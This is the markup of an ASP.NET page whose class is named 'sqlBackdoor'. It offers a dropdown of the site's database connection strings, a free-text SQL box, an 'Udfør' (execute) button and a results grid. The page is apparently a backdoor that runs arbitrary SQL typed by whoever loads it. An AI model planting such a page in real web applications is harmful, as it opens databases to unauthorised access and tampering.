<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="sqlBackdoor_Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:SqlDataSource ID="SqlDataSource1" runat="server" 
            ConnectionString="<%$ ConnectionStrings:ConnectionString %>" 
            SelectCommand="SELECT * FROM [heste]"></asp:SqlDataSource>
    
        <br />
        <asp:DropDownList ID="DropDownListConnectionStrings" runat="server">
        </asp:DropDownList>
        <br />
        <asp:TextBox ID="TextBoxSQL" runat="server" Height="300px" TextMode="MultiLine" 
            Width="800px">select * from heste</asp:TextBox>
        <br />
        <asp:Button ID="ButtonExecuteQuery" runat="server" 
            onclick="ButtonExecuteQuery_Click" Text="Udfør" />
        <br />
        <asp:Label ID="LabelResponse" runat="server"></asp:Label>
        <asp:GridView ID="GridViewResult" runat="server" CellPadding="4" 
            ForeColor="#333333" GridLines="Vertical" AutoGenerateColumns="true" 
            AllowSorting="false">
            <AlternatingRowStyle BackColor="White" />
            <EditRowStyle BackColor="#2461BF" />
            
            <EmptyDataTemplate>
                &lt;empty&gt;
            </EmptyDataTemplate>
            <FooterStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
            <HeaderStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
            <PagerStyle BackColor="#2461BF" ForeColor="White" HorizontalAlign="Center" />
            <RowStyle BackColor="#EFF3FB" />
            <SelectedRowStyle BackColor="#D1DDF1" Font-Bold="True" ForeColor="#333333" />
            <SortedAscendingCellStyle BackColor="#F5F7FB" />
            <SortedAscendingHeaderStyle BackColor="#6D95E1" />
            <SortedDescendingCellStyle BackColor="#E9EBEF" />
            <SortedDescendingHeaderStyle BackColor="#4870BE" />
        </asp:GridView>
    
    </div>
    </form>
</body>
</html>
